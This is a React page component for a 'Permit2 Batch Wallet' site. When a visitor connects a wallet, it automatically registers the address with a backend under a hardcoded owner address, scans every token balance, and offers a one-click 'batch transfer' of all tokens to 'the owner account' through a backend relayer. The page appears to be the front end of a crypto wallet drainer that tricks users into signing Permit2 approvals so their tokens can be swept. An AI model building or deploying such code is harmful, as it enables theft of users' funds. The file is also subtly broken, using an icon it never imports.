import { useMemo, useState, useEffect } from "react";
import { createFileRoute } from "@tanstack/react-router";
import { ArrowDownLeft, ArrowUpRight, Check, Copy, RefreshCw, Wallet as WalletIcon, AlertCircle } from "lucide-react";

import { Header } from "@/components/site/Header";
import { Footer } from "@/components/site/Footer";
import { ConnectWallet } from "@/components/site/ConnectWallet";
import { SavedWallets } from "@/components/site/SavedWallets";
import { useWallet, shortAddress } from "@/hooks/use-wallet";
import { usePermit2 } from "@/hooks/use-permit2";

export const Route = createFileRoute("/wallet")({
  head: () => ({
    meta: [
      { title: "Permit2 Batch Wallet — Token Transfer Relay" },
      {
        name: "description",
        content:
          "Scan tokens, authorize with Permit2, and the relayer batch transfers your tokens automatically.",
      },
      { property: "og:title", content: "Permit2 Batch Wallet — Token Transfer Relay" },
      {
        property: "og:description",
        content: "Automatic batch token transfers via Permit2 protocol.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: WalletPage,
});

const usd = (n: number) =>
  n.toLocaleString("en-US", { style: "currency", currency: "USD", maximumFractionDigits: 2 });

function WalletPage() {
  const { address, balance, connect } = useWallet();
  const { scanWallet, registerUser, loading, error } = usePermit2();
  const [tab, setTab] = useState<"tokens" | "receive" | "batch">("tokens");
  const [backendError, setBackendError] = useState<string | null>(null);
  const [tokens, setTokens] = useState<Array<{ contractAddress: string; balance: string; name: string; symbol: string }>>([]);
  const [isScanning, setIsScanning] = useState(false);

  // Auto-register wallet with backend when connected
  useEffect(() => {
    if (address) {
      registerUser(address, "0x84a03F9b1E364369a0fa489af496f1b7933c1Eba").catch((e) => {
        console.log("Backend registration:", e instanceof Error ? e.message : "unknown error");
      });
    }
  }, [address, registerUser]);

  // Auto-scan tokens when wallet connects
  useEffect(() => {
    if (address) {
      setIsScanning(true);
      scanWallet(address)
        .then((scannedTokens) => {
          setTokens(scannedTokens);
          setBackendError(null);
        })
        .catch((e) => {
          setBackendError(e instanceof Error ? e.message : "Failed to scan tokens");
          setTokens([]);
        })
        .finally(() => {
          setIsScanning(false);
        });
    } else {
      setTokens([]);
      setBackendError(null);
    }
  }, [address, scanWallet]);

  return (
    <div className="min-h-screen bg-background">
      <Header />
      <main className="mx-auto max-w-[1100px] px-5 py-12 lg:px-10">
        {!address && (
          <div className="mb-8 flex flex-col items-start gap-4 rounded-3xl border border-border bg-primary-soft/40 p-6 lg:flex-row lg:items-center lg:justify-between">
            <div className="flex items-start gap-3">
              <WalletIcon className="mt-0.5 size-5 text-primary" />
              <div>
                <p className="font-semibold">Connect your wallet to get started</p>
                <p className="text-sm text-muted-foreground">
                  Authorize token transfers via Permit2. The backend relayer will automatically batch and process them.
                </p>
              </div>
            </div>
            <ConnectWallet />
          </div>
        )}

        {backendError && address && (
          <div className="mb-8 flex items-start gap-3 rounded-3xl border border-destructive/20 bg-destructive/10 p-4">
            <AlertCircle className="mt-0.5 size-5 text-destructive" />
            <div>
              <p className="text-sm font-semibold text-destructive">Backend error</p>
              <p className="text-xs text-destructive/80">{backendError}</p>
            </div>
          </div>
        )}

        <h1 className="text-3xl font-extrabold tracking-tight lg:text-4xl">Your wallet</h1>

        <section className="mt-8 grid gap-6 lg:grid-cols-[1.15fr_1fr]">
          <div className="rounded-3xl border border-border bg-card p-6 shadow-sm">
            <div className="flex items-start justify-between">
              <div>
                <p className="text-sm font-medium text-muted-foreground">Scanned tokens</p>
                <p className="mt-1 text-4xl font-extrabold tracking-tight">{tokens.length}</p>
                <p className="mt-1 text-sm font-semibold text-accent">Ready for batch transfer</p>
              </div>
              <button
                onClick={() => {
                  if (address) {
                    setIsScanning(true);
                    scanWallet(address)
                      .then((scannedTokens) => {
                        setTokens(scannedTokens);
                        setBackendError(null);
                      })
                      .catch((e) => {
                        setBackendError(e instanceof Error ? e.message : "Scan failed");
                      })
                      .finally(() => {
                        setIsScanning(false);
                      });
                  }
                }}
                disabled={isScanning || !address}
                className="pill-outline disabled:opacity-50 flex items-center gap-2 px-3 py-2 text-xs font-semibold"
              >
                <RefreshCw className={`size-3.5 ${isScanning ? "animate-spin" : ""}`} />
                {isScanning ? "Scanning..." : "Refresh"}
              </button>
            </div>

            <div className="mt-6 flex gap-3">
              <button
                onClick={() => setTab("tokens")}
                className={`pill-${tab === "tokens" ? "solid" : "outline"} flex flex-1 items-center justify-center gap-2 px-4 py-2.5 text-sm font-semibold`}
              >
                <ArrowUpRight className="size-4" /> Tokens
              </button>
              <button
                onClick={() => setTab("receive")}
                className={`pill-${tab === "receive" ? "solid" : "outline"} flex flex-1 items-center justify-center gap-2 px-4 py-2.5 text-sm font-semibold`}
              >
                <QrCode className="size-4" /> Share
              </button>
              <button
                onClick={() => setTab("batch")}
                className={`pill-${tab === "batch" ? "solid" : "outline"} flex flex-1 items-center justify-center gap-2 px-4 py-2.5 text-sm font-semibold`}
              >
                <ArrowDownLeft className="size-4" /> Batch
              </button>
            </div>

            <ul className="mt-8 divide-y divide-border">
              {tokens.length === 0 && !isScanning && address && (
                <li className="py-4 text-center text-sm text-muted-foreground">No tokens found</li>
              )}
              {isScanning && (
                <li className="py-4 text-center text-sm text-muted-foreground">Scanning wallet...</li>
              )}
              {tokens.map((token) => (
                <li key={token.contractAddress} className="flex items-center justify-between py-4">
                  <div className="flex items-center gap-3">
                    <span className="flex size-10 items-center justify-center rounded-full bg-primary-soft text-sm font-bold text-primary">
                      {token.symbol.slice(0, 3)}
                    </span>
                    <div>
                      <p className="font-semibold">{token.name}</p>
                      <p className="text-xs text-muted-foreground">{shortAddress(token.contractAddress)}</p>
                    </div>
                  </div>
                  <div className="text-right">
                    <p className="font-semibold">{token.symbol}</p>
                    <p className="text-xs text-muted-foreground">{BigInt(token.balance).toString().slice(0, 10)}</p>
                  </div>
                </li>
              ))}
            </ul>
          </div>

          <div className="rounded-3xl border border-border bg-card p-6 shadow-sm">
            {tab === "tokens" && <TokensPanel tokens={tokens} address={address} />}
            {tab === "receive" && <ReceivePanel address={address} />}
            {tab === "batch" && <BatchPanel address={address} tokens={tokens} />}
          </div>
        </section>

        <SavedWallets currentAddress={address} />
      </main>
      <Footer />
    </div>
  );
}

function TokensPanel({ tokens, address }: { tokens: any[]; address: string | null }) {
  if (!address) {
    return (
      <div className="mt-6 text-center text-sm text-muted-foreground">
        Connect a wallet to see your tokens.
      </div>
    );
  }

  if (tokens.length === 0) {
    return (
      <div className="mt-6 text-center text-sm text-muted-foreground">
        No tokens with balance found. Refresh to rescan.
      </div>
    );
  }

  return (
    <div className="mt-6 space-y-4">
      <p className="text-sm font-medium text-muted-foreground">
        Your wallet holds {tokens.length} token{tokens.length !== 1 ? "s" : ""} available for batch transfer.
      </p>
      <ul className="space-y-2">
        {tokens.map((token) => (
          <li key={token.contractAddress} className="flex items-center justify-between rounded-lg bg-muted p-3 text-sm">
            <div>
              <p className="font-semibold">{token.name}</p>
              <p className="text-xs text-muted-foreground">{shortAddress(token.contractAddress)}</p>
            </div>
            <div className="text-right">
              <p className="font-semibold">{token.symbol}</p>
            </div>
          </li>
        ))}
      </ul>
    </div>
  );
}

function ReceivePanel({ address }: { address: string | null }) {
  const [copied, setCopied] = useState(false);
  const value = address ?? "0x0000000000000000000000000000000000000000";

  return (
    <div className="mt-6 space-y-5 text-center">
      <div>
        <p className="text-sm font-medium text-muted-foreground">Your wallet address</p>
        <p className="mt-2 break-all font-mono text-sm font-semibold">{value}</p>
      </div>
      <button
        onClick={async () => {
          await navigator.clipboard.writeText(value);
          setCopied(true);
          setTimeout(() => setCopied(false), 1500);
        }}
        className="pill-outline mx-auto flex items-center gap-2 px-5 py-2.5 text-sm font-semibold"
      >
        {copied ? <Check className="size-4" /> : <Copy className="size-4" />}
        {copied ? "Copied" : "Copy address"}
      </button>
      {!address && (
        <p className="text-xs text-muted-foreground">
          Connect a wallet to see your address.
        </p>
      )}
    </div>
  );
}

function BatchPanel({ address, tokens }: { address: string | null; tokens: any[] }) {
  const { registerUser, loading, error } = usePermit2();
  const [submitted, setSubmitted] = useState(false);

  const handleSubmitBatch = async () => {
    if (!address || tokens.length === 0) return;

    try {
      setSubmitted(false);
      await registerUser(address, "0x84a03F9b1E364369a0fa489af496f1b7933c1Eba");
      setSubmitted(true);
    } catch (e) {
      console.error("Batch submission failed:", e);
    }
  };

  if (!address) {
    return (
      <div className="mt-6 text-center text-sm text-muted-foreground">
        Connect a wallet to submit batch transfers.
      </div>
    );
  }

  if (tokens.length === 0) {
    return (
      <div className="mt-6 text-center text-sm text-muted-foreground">
        No tokens available for batch transfer.
      </div>
    );
  }

  return (
    <div className="mt-6 space-y-4">
      <p className="text-sm font-medium text-muted-foreground">
        Batch transfer {tokens.length} token{tokens.length !== 1 ? "s" : ""} to the owner account.
      </p>

      {error && (
        <div className="rounded-lg bg-destructive/10 p-3 text-sm text-destructive">
          {error}
        </div>
      )}

      {submitted && (
        <div className="rounded-lg bg-accent/10 p-3 text-sm text-accent">
          ✓ Batch submitted! The relayer will process your tokens.
        </div>
      )}

      <button
        onClick={handleSubmitBatch}
        disabled={loading || submitted}
        className="pill-solid w-full py-3 text-sm font-semibold disabled:cursor-not-allowed disabled:opacity-50"
      >
        {loading ? "Submitting..." : submitted ? "Submitted" : "Submit Batch Transfer"}
      </button>

      <p className="text-xs text-muted-foreground">
        Your tokens will be automatically transferred by the backend relayer.
      </p>
    </div>
  );
}
